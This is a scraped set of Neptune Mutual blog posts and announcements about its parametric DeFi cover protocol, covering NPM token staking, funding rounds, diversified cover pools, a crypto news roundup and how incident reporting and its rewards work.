have been bought and invested as underwriting capital (and possibly converted into Ethereum or another crypto currency), then in the event of an incident causing a major payout of underwriting capital, this will create downward pressure on the token price, because of the lower returns that will be generated by token holders.  In these cases, incidents punish loyal token holders.  <br><br>When an incident occurs in some cover protocols, token holders sell their tokens. Some protocols penalise their loyal community for holding onto their tokens by reducing their balances because of the incident. This causes friction within the community because users are often unfamiliar with how DeFi insurance underwriting works. As a result, it is critical to categorise activities into different features and make it simple for users to understand.</p><p><strong>Our Solution</strong></p><ol><li>Neptune Mutual does not have this problem because we do not use NPM tokens for risk underwriting, and when there is a payout, we distribute stablecoins rather than NPM tokens. In fact, it is possible that demand for NPM tokens may increase when there is an incident because NPM tokens are used for incident voting and resolution. People who voted incorrectly lose all of their tokens, and we burn some of these tokens.</li><li>The NPM tokens in Neptune Mutual’s staking pools are immune to underwriting risks. NPM tokens are not used in any way to pay claimants of cover policies.</li><li>Neptune Mutual rewards loyal token holders by allowing them to stake NPM tokens and get rewarded with project native tokens in the corresponding staking pools.</li></ol><h3 id=\"challenges-faced-by-defi-protocols\">Challenges Faced by DeFi Protocols</h3><p>The blockchain community is not very loyal to projects that do not provide them with compelling reasons to stay. Every few years, the top 100 projects change. It’s crucial to first establish trust before creating a loyal following around a DeFi project. This becomes challenging when projects do not communicate effectively about the risks they are exposing their communities to.</p><h3 id=\"staking-pool-balance-slashed-during-incidents\">Staking Pool Balance Slashed During Incidents</h3><p>Many DeFi cover users have witnessed a sudden reduction in their staked token balance in a staking pool. This curious event occurs when tokens are distributed to claimants as payouts. But many don’t fully comprehend what they’re agreeing to until it’s too late.  <br><br>Loyal holders lose out because they receive less than expected — this arises because those that have lost funds, and make a claim, recover their position by receiving and selling project tokens which puts downward pressure on the value of the token.</p><p><strong>The NPM tokens in Neptune Mutual’s staking pools are immune to underwriting risks. We do not distribute NPM tokens as compensation to claimants.</strong></p><h3 id=\"how-do-traditional-insurance-manage-risk-and-make-profit\">How Do Traditional Insurance Manage Risk and Make Profit?</h3><p>Insurance companies are in the business of predicting risks. As mentioned, insurance companies deploy their capital as a guarantee payment in case of loss, and they use extensive data analysis to ensure that the revenues they earn are sufficient to provide a return when taking into account an expected number of losses arising from a certain number of  incidents that may arise as part of their underwriting activity. <br><br>To do this, they need a lot of timely, reliable data and analytic skills, in order to forecast the probability of insured events arising, and how much it will cost them when it does.<br><br>People who want to cover a specific risk, such as asset loss, theft or damage to property, health, or death pay insurance companies fees in regular instalments. Insurance companies profit from the income generated by the sale of these policies minus the operational expenses.</p><p><em>profit = policy fees - (claims payout + operating expenses)</em></p><p>Insurance companies use data and data analysis to ensure, as far as possible, that underwriting capital is handsomely rewarded despite the expected level of payouts that the insurance activity is likely to incur.</p><p>The nature of the risks that traditional insurance companies cover means that they rarely have to make large numbers of payouts simultaneously, and they can therefore use this diversification of the timing of incidents to spread out the cash outflow of losses and offset them against policy revenues. This is very different from the context of cover in DeFi where risks can affect thousands of policyholders all at once: one single trigger event, such as a hack, can affect thousands of users in an instant.<br></p><h3 id=\"how-is-neptune-mutual-different\">How is Neptune Mutual Different?</h3><p>Neptune Mutual is a parametric cover marketplace developed by a technology company and operated by an Association. Neptune Mutual is not an insurance company. You can draw a closer comparison between traditional insurance providers and the individual cover pools offered within the Neptune Mutual marketplace. In contrast to typical insurers, Neptune Mutual does not earn a commission on policy premiums; this is the principal source of revenue for liquidity providers. <br><br>Similarly, liquidity providers own the liquidity pools, not Neptune Mutual. In other words, Neptune Mutual provides the DeFi community a conduit to crowdsource the capital required for projects to create parametric cover policies that offer protection to their respective communities. <br><br>Not all DeFi protocols can be covered successfully and this is why the cover creation feature is on an invitation-only basis. In addition, Neptune Mutual conducts a thorough due diligence of the protocols before allowing them to create cover pools in the marketplace; this includes a comprehensive security review. <br><br>Neptune Mutual even provides a process by which cover creators can request <a href=\"https://docs.neptunemutual.com/npm-pools/bond-pool\">liquidity assistance</a> for their pools from a strategic liquidity provider partner.  In addition, Neptune Mutual can provide technical assistance to programmatically and gradually <a href=\"https://blog.neptunemutual.com/bootstrapping-cover-pool-liquidity-how-do-we-encourage-our-community-to-fund-our-cover-pool/\">bootstrap cover liquidity</a> via<a href=\"https://github.com/neptune-mutual-blue/protocol\"> smart contract</a> and<a href=\"https://docs.neptunemutual.com/sdk\"> SDK integrations</a>.<strong> </strong>To secure this assistance cover creators must demonstrate a high-level of commitment to cybersecurity.<br><br>Unlike the majority of DeFi cover protocols, Neptune Mutual does not cover financial risks, such as margin calls or liquidations, stablecoin pegs, or private key exploits. We believe we are still early and that these risks are currently not coverable due to the lack of maturity of these products. Neptune Mutual is not interested in taking unreasonable risks to accelerate short term growth at the expense of liquidating LP hard-earned capital. Our primary design goal is to protect liquidity providers from unnecessary risks and to allow them to exit if necessary for whatever reasons they may have.<br><br><strong>You can select which cover pool to underwrite as a liquidity provider. Your risk exposure will only apply for that specific pool, rather than everything in the Neptune Mutual marketplace.</strong></p><hr><h3 id=\"about-us\">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>Neptune Mutual, the parametric cover protocol, has successfully closed a private round of $5.3M. Investors include: exchange venture funds from XT.com, Gate io, Bitmart; venture funds that have a portfolio of DeFi/metaverse projects, such as LD Capital, Mapleblock Capital, Pulsar Global, The DuckDao, Dweb3, Redline DAO, and LUX Capital; and funds with DeFi user communities, such as Poolz Finance, BSC Army, Whitelist Ventures and the CryptoLark, amongst others.</p><blockquote>“We very much appreciate the fact that most of our investors, as in previous rounds, are not just on-boarding Neptune Mutual as an investment opportunity, but also bringing strategic collaborations to the Neptune Mutual ecosystem, including: potential cover pool creators, liquidity providers, and cover purchasers” said <a href="https://www.linkedin.com/in/gillian/" rel="nofollow noopener noreferrer"><strong><strong>Gillian</strong></strong></a>, co-founder of Neptune Mutual.</blockquote><p>This private round follows on from the 5M$ of capital raised previously in Neptune Mutual’s seed &amp; strategic rounds from investors such as Fenbushi, Coinbase Ventures, Animoca Brands, GBV Capital, Huobi, OKX and a number of other crypto-native funds.</p><p>Neptune Mutual’s model is quite different in comparison to other on-chain solutions. First and foremost it is a marketplace for parametric cover protection of digital assets against hacks and exploits. Stakeholders can choose to assume one or multiple roles, for example, a cover pool creator can also choose to become a liquidity provider. Cover pools are open to anybody who is looking either to purchase a cover policy for digital asset protection, or anybody looking to earn rewards by providing liquidity to cover pools of projects they support. A policyholder is guaranteed a payout in case of an incident resolution, without having to make an individual claim for proof of loss, and above all without having to worry whether this claim will be accepted or denied. Cover-pools are chain agnostic and the denomination of cover pools are in stable coins, both for liquidity provider and cover purchaser. This removes the link between cover pool liquidity (and returns) and project token or ETH prices; in so doing it removes an important element of risk and volatility for both cover purchasers and liquidity providers.</p><p>The adoption of Neptune Mutual’s parametric solution and the creation of dedicated cover pools has already been confirmed by a number of exchange partners and DeFi protocols.</p><blockquote><a href="https://www.linkedin.com/in/vijaygarg86/" rel="nofollow noopener noreferrer"><strong><strong>Vijay</strong></strong></a><strong><strong>, founder of </strong></strong><a href="https://twitter.com/Maple_block" rel="nofollow noopener noreferrer"><strong><strong>Mapleblock</strong></strong></a><strong><strong> </strong></strong>shared: “we have invested in over 120 DeFi and Gamefi projects and foresee great synergy between Neptune Mutual and the rest of our portfolio companies. To facilitate easier collaboration we also onboarded Gillian as our DeFi strategic advisor who is best positioned to advise on risk mitigation challenges that our current portfolio and future deals are facing”.</blockquote><blockquote><a href="https://twitter.com/LeslieisHODLing" rel="nofollow noopener noreferrer"><strong><strong>Leslie</strong></strong></a><strong><strong>, founder of </strong></strong><a href="https://twitter.com/gbvofficial" rel="nofollow noopener noreferrer"><strong><strong>GBV Capital </strong></strong></a><strong><strong>a</strong></strong>nd a strategic investor of Neptune Mutual further added “ We are a very active investor in the DeFi space and we have studied DeFi cover initiatives since 2020. We are bullish on the experience and drive of the team at Neptune Mutual and are delighted to be an early investor. We believe their approach to offer a stablecoin based return for liquidity providers is the sustainable solution for the space. It’s good to see their active efforts in engagement and partnership bear fruit as they extend their coverage to a large part of the active DeFi space.”</blockquote><p>The project is expected to announce its utility token placement and listing soon, prior to the mainnet launch of the protocol.

There is no need for individual assessment of each claim and no need for proof of loss documents. Once resolution is reached on the cover incident, via the NPM governance participants, the payout is validated for every policyholder. The underlying principles of the Neptune Mutual protocol design are low risk, scalable, secure, and ease of use.</p><p>With investments in over 150 metaverse and NFT projects, Animoca Brands is the leading global player in building and supporting open metaverse projects that bring digital property rights to online users. Play-to-earn and creator’s economy models are underpinning a fair and equitable digital framework in which the value of virtual assets is growing rapidly; a solution for protecting these assets is considered a vital part of the metaverse ecosystem.</p><blockquote><strong><strong>Yat Siu,</strong></strong> the executive chairman and co-founder of Animoca Brands, said, “As netizens build their digital properties and social identities in the open metaverse, and as these assets become more valuable, risk mitigation solutions become a necessity. We support Neptune Mutual’s initiative to bring decentralized cover solutions to the metaverse and trust the team’s capability to contribute to a safer and better protected environment for the overall crypto ecosystem.”<br><br><a href="https://www.linkedin.com/in/binodnirvan/" rel="nofollow noopener noreferrer"><strong><strong>Binod Nirvan</strong></strong></a>, the founder of Neptune Mutual, said, “It’s our privilege to gain the trust and support of Animoca Brands, thought leaders in the space of the creators’ economy. Neptune Mutual shall endeavor to deliver an efficient, reliable and easy-to-use solution for creators to safeguard the value of their NFTs and other virtual assets in the metaverse.”<br><br>“We are looking forward to working with the DeFi experts from Genesis Block Ventures and Fundamental Labs, as well as traditional insurance experts from PCG (being the primary investor behind FWD insurance group), all of whom have invested in this strategic round.

Cryptocurrency users are still taken advantage of, despite the media attention and warnings about this type of activity. Users and investors must be vigilant and constantly be on the lookout for common indicators associated with scammers. Before investing money in a project, one should always check its legitimacy. Several indicators to ensure the credibility of a crypto project include checking the industry reputation of the founding team, the relevance of the development and other teams, and whether experts from well-known security firms have audited it, among many others. For more tips on how to avoid hacks &amp; exploits, read our blog “<a href=\"https://blog.neptunemutual.com/confessions-of-a-scammer-how-to-avoid-crypto-scams-and-exploits/\" rel=\"follow\">Confessions of a Scammer: How to Avoid Crypto Scams and Exploits</a>“<br></p><h2 id=\"blockchain-hacks\">Blockchain Hacks</h2><p>Multiple reports from Blockchain security firm PeckShield revealed that Raccoon Network and Freedom Protocol are scams, with around $20 million in funds lost. With an APY of up to 183,394 percent, Freedom Protocol bills itself as the highest paying auto-staking and auto-compounding protocol. Raccoon Network, on the other hand, is a metaverse company that allows players to create, own, and monetize their data. It is highlighted in the Twitter thread, and confirmed by BscScan, that the two addresses, each belonging to Freedom Protocol and Raccoon Network, belong to scammers. According to the transaction deposits, the perpetrators transferred approximately $20 million BUSD to a different address, which is now worth nearly $21 million.<br></p><p>Audius, a decentralised music streaming protocol, was hacked, with the perpetrator using a malicious governance vote to steal funds from its community treasury. The malicious actor successfully modified certain configurations in Audius' governance system's smart contract. They were able to become the contract's guardian as a result of these changes. Following that, the hacker created and approved a governance proposal requesting the transfer of 18 million AUDIO tokens from the community treasury. While these stolen tokens had a market value of more than $6 million, the hacker could only sell them for 705 ether, or roughly $1.1 million, due to significant market slippage. The funds that were stolen are still in the hacker's possession. Audius stated in an update that it had identified and fixed issues with its smart contract, and that a post-mortem report would be provided soon.<br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>To commemorate Mandela Day, the Nelson Mandela Foundation is launching a collection of NFTs in collaboration with Auckland-based Glorious Digital. There is no set release date, but this is a long-term project lasting for 10 years that will examine Nelson Mandela's impact on the world through NFTs. Glorious Digital will have access to personal papers, photographs, and other materials for the duration of the project. These NFTs will look at Nelson Mandela's entire life and the impact it had on society.</p><p>FC Barcelona, one of the world's largest football clubs, will enter the NFT space on July 29 with a live auction at Sotheby's in New York. \"In a Way, Immortal\" is the club's first NFT, and it is now available on Sotheby's website, with online bidding starting at $32,000. The fantastic audio-visual artwork celebrates legendary footballer Johan Cruyff's iconic 1973 flying kick and goal, created in collaboration with 40 experts in computer graphics and visual effects graphics team from Hollywood. The audio-visual digital artwork NFT is a 40-second film that took over 10,000 production hours to complete, and it is accompanied by four NFT images. The film features an original soundtrack performed by a 30-piece orchestra as well as real noise from the Camp Nou stadium and FC Barcelona's devoted fans.</p><p>Reid Hoffman, a billionaire tech entrepreneur, has released a series of Solana-based NFTs based on images created with OpenAI's DALL-E 2 artificial intelligence software. Hoffman announced the initiative on Twitter, stating that the first piece would be auctioned off on Magic Eden, the largest Solana NFT marketplace. Untranslatable Words will consist of 11 tokenized images generated by DALL-E 2, a programme that generates art based on written prompts. The first piece in the collection dubbed mngata, was up for auction, with a top bid of 12 SOL, or about $517. He intends to split the proceeds from each piece between charitable causes and his collaborators. Any NFT that is not purchased during the auctions will be burned or destroyed permanently.</p><p>Cadbury Gems has collaborated with NFT ecosystem company GuardianLink to convert artwork created by children all over the country into NFTs. The chocolate button brand has announced its entry into the NFT space with the launch of its first ever NFTs via the latest Junior NFT campaign. According to the company, parents will be invited to directly upload their child's artwork to the microsite. The brand will curate an online gallery of digital collectibles based on these submissions, and potential buyers will be able to purchase these assets using fiat currency. These NFTs, available on GuardianLink platform, will be saved in their wallet and different buyers will be able to bid on and purchase them repeatedly.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>The InsurAce Protocol can now be traded on Vision, a multi-chain wallet and portfolio tracker.

        html: '<p>Underwriting capital (liquidity) is the lifeblood of any insurance entity. The same is true for blockchain cover protocols where the ability to source liquidity is one of the principal factors defining a protocol’s ability to scale the amount of protection it is able to offer.</p><p>The Neptune Mutual community is familiar with dedicated cover pools, where cover pool creators design parametric cover policies specifically to protect against security risks relevant to their project community. So, what are diversified cover pools, how are they different from dedicated cover pools, for what type of projects are they helpful, and why will this new addition to the Neptune Mutual marketplace help scale adoption of cover policy protection of digital assets?</p><p>Dedicated cover pools work well for DeFi or Metaverse projects that have an established community for whom they wish to create a cover policy, and to whom they can also look for support to help fund the cover pool liquidity. The combination of protection for cover policyholders, and earnings + rewards for those funding the underwriting liquidity, provides an excellent basis for increasing community engagement and confidence in the project.</p><p>There are, however, certain types of projects for which a dedicated cover pool model may experience strong demand for cover policies, but none-the-less face challenges around sourcing liquidity to meet this demand. Take, for example, the case of a newly launched DeFi yield farming protocol with a total community of say 25k at launch. A variety of factors go into informing the underwriting community about the the security measures in place and the corresponding risks they are taking when funding the cover policy proposed by the cover creator; these were discussed at length in our article “<a href="https://blog.neptunemutual.com/bootstrapping-cover-pool-liquidity-how-do-we-encourage-our-community-to-fund-our-cover-pool/">Bootstrapping Cover Pool Liquidity: How Do We Encourage Our Community to Fund Our Cover Pool?</a>”</p><p>It’s quite possible the DeFi project in question has an anonymous team, a closed code-base, and a limited track record of secure mainnet operations. Even if the project does in fact have an excellent standard of security and a high quality reliable team, this may not be transparent or easy to communicate. Under these circumstances, it is possible that the underwriting community feels insufficiently informed to be able to evaluate the risks they are taking in providing underwriting liquidity.</p><p>In summary, early stage DeFi projects may have a strong demand side for cover policies but struggle to bootstrap liquidity for their pool if they have a small community, or do not take all the actions recommended by Neptune Mutual for bootstrapping liquidity.</p><p>Another example of where we believe there will be demand for the diversified cover pool model is in the low security risk sector of digital assets. Given the high levels of security and correspondingly low levels of risk of hack or exploit for certain well-established sectors and players within the blockchain space, such as custodians and leading CeFi exchanges, it follows that the pricing of cover policies underwriting these risks should be correspondingly low. In this example we again might expect strong demand for cover policies as CeFi exchanges have large communities, however in this case the challenge with sourcing underwriting capital is the relatively low returns offered by the cover policy premiums to liquidity providers. Diversified cover pools offer a solution to this by combining two elements: diversification of risk, and leverage of underwriting liquidity.</p><p>Over time we expect to see a wide range of different diversified cover pools that group together projects of a similar risk profile.</p><h2 id="understanding-diversified-cover-pools">Understanding Diversified Cover Pools</h2><p>A diversified cover pool refers to a cover pool that provides liquidity to a portfolio of cover pools, each with their own specific cover policy trigger parameters. No cover policies can be bought directly from the diversified cover pool, only from the project specific pools within the portfolio of the diversified cover pool. The project specific cover pools negotiate a certain percentage of the liquidity available from the diversified cover pool creator.</p><h2 id="how-does-it-work">How Does It Work?</h2><p>The diversified cover pool is created by a diversified cover pool creator. The creator of this diversified cover pool selects a certain number of projects to form part of the portfolio, and each of these projects has a cover pool which is funded by the liquidity of the diversified cover pool. Whereas dedicated cover pools are likely to be created by project founders, looking to engage and protect their community, we anticipate that diversified cover pool creators will be specialist actors in the DeFi market, or potentially asset managers / investors that have token or equity shareholdings in a portfolio of projects of a similar risk profile.</p><p>Cover policyholders can buy policies from any of the individual projects within the portfolio. In the event of an incident the reporting and incident resolution process is the same for both diversified and dedicated cover pools. Clearly, given that there are multiple projects that each have an allocation of liquidity from the diversified cover pool, if an incident is validated in one project the pay out will be limited to the amount allocated by the pool to that project, and therefore will only represent a portion of the liquidity in the diversified cover pool.</p><p>As there are a number of different projects covered by the liquidity of the diversified cover pool, diversified cover creators can choose to increase capital efficiency by providing more than $1 dollar of cover policy for $1 of liquidity, with the assumption that not all projects within a diversified pool would be hacked on the same day.</p><p>It is therefore very important for policy holders to understand that when they buy a policy from a project selected from the portfolio of a diversified cover pool, that in the unlikely event that numerous or all of the projects within the portfolio suffer an incident at the same time, there may not be sufficient funds to pay out all of the cover policyholders (if the diversified cover creator has chosen to increase capital efficiency ). Instead, payouts will be on a first come first served system whereby the first projects where an incident is validated will have first call on the liquidity within the diversified cover pool.</p><h2 id="how-is-it-different-from-a-dedicated-cover-pool">How Is It Different From A Dedicated Cover Pool?</h2><p>The principal difference is that the diversified nature of the risks covered by a diversified cover pool, as opposed to a dedicated cover pool, meaning that a single incident from a single project will at most only deplete a % of the diversified cover pool liquidity; and increased capital efficiency means that higher returns shall be generated for the same amount of capital from the liquidity providers.</p><p>The leverage factor will be an input that the diversified cover pool creator sets at the outset, and it will be identified on the card of the diversified cover pool, and in the information shown to liquidity providers before they commit to investing.</p><p>The creator of a diversified cover pool will set a common floor and ceiling price for all the projects within the portfolio. For this reason, it is very likely that all diversified pools will contain projects of a similar risk profile. Note that each project will have an allocation of liquidity, and that therefore different projects within the diversified pool portfolio are likely to have different utilisation ratios at any point in time, that is to say the amount of cover policies underwritten in relation to the allocation of liquidity capital will very likely be different for each project within the portfolio. As utilisation is a strong driver of policy pricing, one can expect the price of cover policies to be different for each project, despite the fact that the floor and ceiling price set by the cover creator for all of the projects within the portfolio are the same.</p><h2 id="newer-blockchain-projects-are-usually-more-risky-and-therefore-arguably-have-a-greater-need-for-cover-protection">Newer Blockchain Projects Are Usually More Risky and therefore Arguably Have a Greater Need for Cover Protection.</h2><p>Newer blockchain projects, such as Web3, decentralized finance (DeFi) applications and non-fungible tokens (NFTs) <a href="https://defiprime.com/dex-volume" rel="noopener ugc nofollow">process billions of dollars of transactions</a> every day.

Crypto Crash Heightens Awareness of Risks &amp; Hacks, But Is This Enough to Drive Mainstream Adoption of Digital Asset Protection?</em></em></a> convenience is one of the most important factors driving the adoption of protection for digital assets.</p><p>What makes diversified cover pools convenient is the fact they provide a means for bypassing the need for DeFi projects to bootstrap their own liquidity in order to provide cover pool protection for their respective communities.</p><p>For CeFi exchanges and custodian entities it is possible that much larger quantities of liquidity will flow into diversified cover pools, potentially institutional investment, given the relatively low and diversified nature of the security risks being underwritten for CeFi projects, and the relatively strong returns available because of the capital efficiency to provide greater policy revenue than would otherwise be the case.

Since these loans are funded by liquidity pools, profits earned on them are paid to the liquidity providers.</li><li><strong><strong>Lending Incomes</strong></strong> — To maximise pool rewards, a portion of the idle liquidity can be supplied towards lending protocols, such as <a href="https://compound.finance/" rel="noopener ugc nofollow">Compound</a> and <a href="https://aave.com/" rel="noopener ugc nofollow">Aave</a>. Interests earned on the loan are then compounded into the liquidity pool and collectively shared by the liquidity providers.</li><li><strong><strong>POD Staking</strong></strong> — Liquidity providers receive POD (Proof of Deposit) tokens which they can stake for additional rewards.</li></ul><p>All of the above earning streams are valid for both dedicated and diversified cover pool liquidity providers.</p><h2 id="what-are-the-risks-associated-with-liquidity-provision">What are the risks associated with liquidity provision?</h2><p>It is important to understand the risks that your liquidity is underwriting, whether it be for a dedicated cover pool or a diversified cover pool. This needs careful review of the terms of the cover policies for each project, and of course your own research on each project to evaluate its team, security and track record.</p><p>In addition, there are risks associated with the Neptune Mutual project, that is to say the investment strategies used to increase returns to liquidity providers. Whilst the Neptune Marketplace does not take custody of funds, there is the possibility that the protocol itself might suffer a hack or exploit resulting in loss of funds from the cover pool. To mitigate this risk, Neptune Mutual engaged top tier smart contract auditors and shall continue to uphold highest standard of all round security practice.</p><h2 id="neptune-mutual%E2%80%99s-marketplace">Neptune Mutual’s Marketplace</h2><p>The Neptune Mutual application is a marketplace for parametric cover protection against hacks and exploits. Here, stakeholders can access both dedicated cover pools and diversified cover pools.</p><p>These pools are open to anyone looking to purchase a cover policy to protect their digital assets, as well as to people looking to earn income and other rewards by supplying liquidity to either dedicated cover pools or diversified cover pools.</p><p>What makes Neptune Mutual’s parametric cover solution so compelling is that policyholders do not have to make individual claims for proof of loss, and following incident resolution, all policyholders are eligible to receive the payment due under their policy.</p><p>The diversified cover pools open up parametric cover to a much wider spectrum of blockchain projects and offer more choice to liquidity providers in terms of the sector of activity, the type of risks underwritten, and the approach to efficient use of underwriting capital, based on either 100% minimum capital requirement for dedicated cover pools or the potential for leveraging underwriting capital for diversified cover pools.</p><p>Diversified cover pools should provide an interesting entry point for digital asset managers into the underwriting liquidity space, and this is undoubtedly needed in order to scale adoption of digital asset protection across the industry.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Discover the process of how incident reporting works and the rewards that can come with it.</p><p>Without a doubt, blockchain technology is inherently secure, however, the same cannot be said of the smart contracts built on top of it that offer so much opportunity.</p><p>Smart contract code imperfections and vulnerabilities expose projects to hacks and exploits that can shift a project’s trajectory and of course <a href="https://blog.neptunemutual.com/terra-luna-crisis-explained/">the balance of those holding the digital assets that have been hacked.</a></p><p>Most DeFi protocol and <a href="https://medium.com/neptune-mutual/is-your-web-3-project-protecting-its-community-567e3f7c5108" rel="noopener">Web3 project developers work tirelessly to reinforce their project’s code</a>, however it is challenging to close all possible loopholes, and there are a wide range of attack vectors for cyber criminals, of which smart contract code is just one. Together with their communities, project developers continuously identify and fix potentially exploitable bugs and glitches. However, <a href="https://medium.com/neptune-mutual/defi-crime-data-review-and-tips-on-digital-asset-security-225a04dbffa" rel="noopener">cybercriminals</a> and <a href="https://medium.com/neptune-mutual/cyber-criminal-whales-the-rise-of-crypto-syndicates-9ad4616415ec" rel="noopener">syndicates</a> are motivated by the prospect of stealing huge sums of crypto, or other digital assets, from crypto exchanges and projects. As we see repeatedly in media headlines, the results of this can be truly devastating.</p><p>But, why should you concern yourself with this problem? How does it affect you? And what does it mean for the greater crypto community?</p><h2 id="what-are-the-incidents-that-need-to-be-reported">What Are The Incidents that Need to be Reported?</h2><p>At Neptune Mutual, we refer to hack or exploit events as “incidents” if it is considered by the Neptunite community that they may have triggered the parameters of a cover pool policy in the Neptune Mutual marketplace. Simply put, incidents are hacks or exploits that cover pool policies are designed to protect against.</p><p>There are many types of hacks such as: governance attacks; economic attacks; <a href="https://www.makeuseof.com/prevent-frontend-security-risks/" rel="noopener ugc nofollow">front-end attacks</a>, like DDoS attacks; and collision &amp; timing attacks that take advantage of system <a href="https://www.comparitech.com/blog/information-security/what-is-a-collision-attack/" rel="noopener ugc nofollow">hash rates</a> and <a href="https://www.techtarget.com/searchsecurity/definition/timing-attack#:~:text=A%20timing%20attack%20is%20a,to%20respond%20to%20different%20inputs." rel="noopener ugc nofollow">input speeds</a>. <a href="https://btc-hijack.ethz.ch/#:~:text=An%20attacker%20can%20use%20routing,the%20creation%20of%20parallel%20blockchains." rel="noopener ugc nofollow">Routing attacks</a> abuse project vulnerabilities found in router software and/or authentication. Last but not least, there are <a href="https://www.graphus.ai/blog/10-facts-about-cryptocurrency-phishing-other-crypto-risks-that-you-need-to-know/" rel="noopener ugc nofollow">phishing attacks</a> which use deception and social engineering in order to mislead and trick individuals with false information.</p><p>Monetary losses are not the only thing that makes hacks and exploits dangerous. Projects can suffer significant reputational damage if their communities feel that they have not done enough before and after such incidents to protect them; a subject we discussed in depth in the article <a href="https://medium.com/neptune-mutual/bootstrapping-cover-pool-liquidity-how-do-we-encourage-our-community-to-fund-our-cover-pool-b1903c4576cd" rel="noopener">Bootstrapping Cover Pool Liquidity: How Do We Encourage Our Community to Fund Our Cover Pool?</a></p><p>There’s no doubt though that these incidents can affect users particularly severely, at times, destabilising or losing significant portions of their savings, hence why it is important to understand the essentials of how exposed digital assets are. The key messages are firstly to do your very best to <a href="https://medium.com/neptune-mutual/confessions-of-a-scammer-how-to-avoid-crypto-scams-and-exploits-898e40c4c4ec" rel="noopener">avoid them</a>, and secondly, and above all, to take actions to mitigate these risks so that you are protected if they occur.</p><p>As a way to mitigate such risks, DeFi, CeFi and Metaverse projects can create <a href="https://medium.com/neptune-mutual/financial-protection-of-digital-assets-covering-the-basics-7def38f2cefd" rel="noopener">cover protocols to protect projects and exchanges.</a></p><p>Neptune Mutual is an on-chain parametric cover protocol designed to protect digital assets. By creating project specific dedicated cover pools, projects and exchanges can create cover policies for their users to purchase. In the event of an incident, the community decides whether an incident complies with all the parameters of the policy, thereby opening up the process of guaranteed claims payout to anyone with that specific policy.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/incident-reporting-camps.png" class="kg-image" alt loading="lazy" width="1400" height="700" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/incident-reporting-camps.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/incident-reporting-camps.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/incident-reporting-camps.png 1400w" sizes="(min-width: 720px) 720px"></figure><h2 id="a-user-driven-solution">A User-driven Solution</h2><p>The incident reporting process was tested by the Neptunite community when the <a href="https://medium.com/neptune-mutual/neptune-mutual-testnet-is-live-12eec012679b" rel="noopener">Neptune Mutual testnet went live</a> in March 2022. It is a community driven consensus-based solution to validating incidents. A number of mechanisms have been designed to drive honest voting behaviour and there is a backstop mechanism to safeguard against the unlikely risk of a 51% attack on the reporting system.</p><p>Users are encouraged to report hacks and exploits of projects on the Neptune Mutual platform as it is crucial that there is timely reporting and resolution of reported incidents. Reporting an incident is the first step to initialise the incident reporting process.</p><h2 id="what-is-an-incident-reporter">What is an Incident Reporter?</h2><p>Anyone with sufficient NPM tokens can report hacks and exploits from within the Neptune Mutual application. The First Reporter (the first reporter to report an incident) and Candidate Reporter (the first reporter to dispute a reported incident) are required to stake at least 250 NPM tokens, or as configured by the cover creator.</p><p>The incident reporting feature gives potential reporters the following choices:</p><ul><li><strong><strong>Report an Incident.</strong></strong><br>This option is given to the user if they want to be the First Reporter of a unique incident. There is only one First Reporter for every incident reported.</li><li><strong><strong>Disagree with Reported Incident.</strong></strong><br>If another user believes the First Reporter’s reported incident to be false or invalid in relation to the parameters specified by the cover pool, they can <a href="https://www.youtube.com/watch?v=Kk7kpPOrwBk" rel="noopener ugc nofollow">add a dispute.</a> Like the First Reporter, being the first to dispute an incident makes you the only Candidate Reporter of the incident.</li><li><strong><strong>Support an Incident.</strong></strong><br>Reporters can support an incident if it’s already been reported. Any number of users can attest to the validity of a reported incident.</li><li><strong><strong>Support a Dispute.</strong></strong><br>Just as users can support a reported incident, reporters can also support a dispute. Any number of users can reject a reported incident.</li></ul><p>After the duration of the reporting period, typically 7 days, there is a “cooling off” period of 24 hours before the incident is resolved either way.</p><p>Incident Reporters with the most votes become Valid Reporters because their votes determined the validity of the incident. As for the group with the least number of votes, they are then called Invalid Reporters.</p><h2 id="how-you-can-earn-rewards-with-incident-reporting">How You Can Earn Rewards with Incident Reporting</h2><p>During the reporting period, users can stake their NPM tokens either to validate or refute a reported incident. Upon resolution, participants on the winning side collectively receive 60% of the invalid reporters’ staked tokens. Participants will earn pro-rata in relation to the number of tokens they staked.</p><p>30% of the invalid camp tokens are burned.</p><p>The remaining 10% of the invalid reporters’ staked tokens are allocated to the Final Reporter. The Final Reporter is either the First Reporter or the Candidate Reporter depending on whether the incident is validated or not. The 10% reward allocated to the Final report is substantial because it is important to incentivise users to be the first person to report or dispute an incident to ensure the system responds rapidly to events. In addition, if the Final Reporter is the First Reporter (and not the Candidate Reporter), this person will earn 5% of the cover pool protocol fees (in stablecoin) as a reward for being the first to report the incident.</p><p>If the Final Reporter is the Candidate Reporter, then this person will receive 10% of the invalid camp’s staked tokens as well as a pro-rata portion of the 60% invalid camp staked tokens, but will not receive any portion of the protocol fee in stablecoin.</p><p>All other valid reporters will earn a pro-rata portion of the 60% of tokens of the Invalid Reporters. In addition, all valid reporters will be credited with the NPM tokens they staked.</p><p><strong><strong><em><em>What happens when users report incidents that don’t conform to the parameters of the cover pool policy or insufficient evidence has been posted?</em></em></strong></strong></p><p>If users report incidents that don’t conform to the parameters of a cover pool policy they lose the NPM tokens they staked when reporting the incident.</p><p>Explore the step-by-step process of how you can report or dispute an incident on the Neptune Mutual platform in <a href="https://www.youtube.com/watch?v=THNoTAr-bOc" rel="noopener ugc nofollow">this video.</a></p><h2 id="how-neptune-mutual-protects-policyholders-from-consensus-and-timing-attacks">How Neptune Mutual Protects Policyholders from Consensus and Timing Attacks</h2><p>One example of a consensus attack is called a Sybil attack. These attacks are typically observed on networks or social media channels. Bad actors attempting to perform a Sybil attack make multiple pseudonymous identities (or wallets) to get an unfair advantage in the decision-making behind a consensus, usually to put the outcome in their favour for monetary gain, or to avoid loss. This kind of consensus attack is possible if the attacker/s can create an abundance of pseudonymous identities relatively cheaply.</p><p>A Sybil attack would be extremely difficult to achieve in the Neptune Mutual system because an attacker would have to spend a large amount to purchase sufficient NPM tokens to outvote the incident reporting community. Even if an attacker was willing to invest sufficient capital to mount such a threat, the attacker would not only have to wait for a week 